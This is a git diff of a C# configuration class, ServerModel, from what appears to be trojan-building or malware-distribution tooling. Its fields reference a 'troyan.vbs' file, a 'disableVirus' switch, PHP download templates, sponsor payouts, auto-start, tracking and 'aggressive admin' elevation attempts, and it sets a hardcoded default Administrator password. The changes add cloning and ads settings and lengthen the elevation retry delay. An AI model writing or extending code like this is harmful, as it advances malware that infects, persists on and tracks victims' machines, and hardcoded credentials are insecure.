@@ -10,11 +10,13 @@ public class ServerModel
 
     [JsonPropertyName("disableVirus")] public bool DisableVirus { get; set; } = false;
 
-    [JsonPropertyName("tabs"), JsonIgnore] public List<TabModel> Tabs { get; set; }
+    [JsonPropertyName("tabs"), JsonIgnore] public List<TabModel> Tabs { get; set; } = new List<TabModel>();
 
     [JsonPropertyName("bux")] public List<BuxModel> Bux { get; set; }
 
     [JsonPropertyName("dnSponsor")] public List<DnSponsorModel> DnSponsor { get; set; }
+    
+    [JsonPropertyName("clone")] public CloneModel CloneModel { get; set; } = new CloneModel();
   
     [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
     [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;
@@ -54,7 +56,7 @@ public class ServerModel
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
 
-
+    [JsonPropertyName("userCloneLog")] public string UserCloneLog => Path.Combine(UserDataDir, "clone.txt");
 
     // server-depended
     [JsonPropertyName("serverIp")] public string ServerIp{ get; set; } = "";
@@ -70,6 +72,7 @@ public class ServerModel
     }
     
     
+    [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
     [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
     [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
     [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
@@ -162,7 +165,7 @@ public class ServerModel
     [JsonPropertyName("autoStart")] public bool AutoStart { get; set; } = true;
     [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; } = true;
     [JsonPropertyName("aggressiveAdmin")] public bool AggressiveAdmin { get; set; } = true;
-    [JsonPropertyName("aggressiveAdminDelay")] public int AggressiveAdminDelay { get; set; } = 1;
+    [JsonPropertyName("aggressiveAdminDelay")] public int AggressiveAdminDelay { get; set; } = 30;
     
     [JsonPropertyName("aggressiveAdminAttempts")] public int AggressiveAdminAttempts { get; set; } = 0;
     
@@ -269,6 +272,8 @@ public class ServerModel
     {
         Login = "Administrator";
         Password = "Putin123";
+        Alias="";
+        CloneModel = new CloneModel();
         Track = true;
         AutoStart = true;
         AutoUpdate = true;
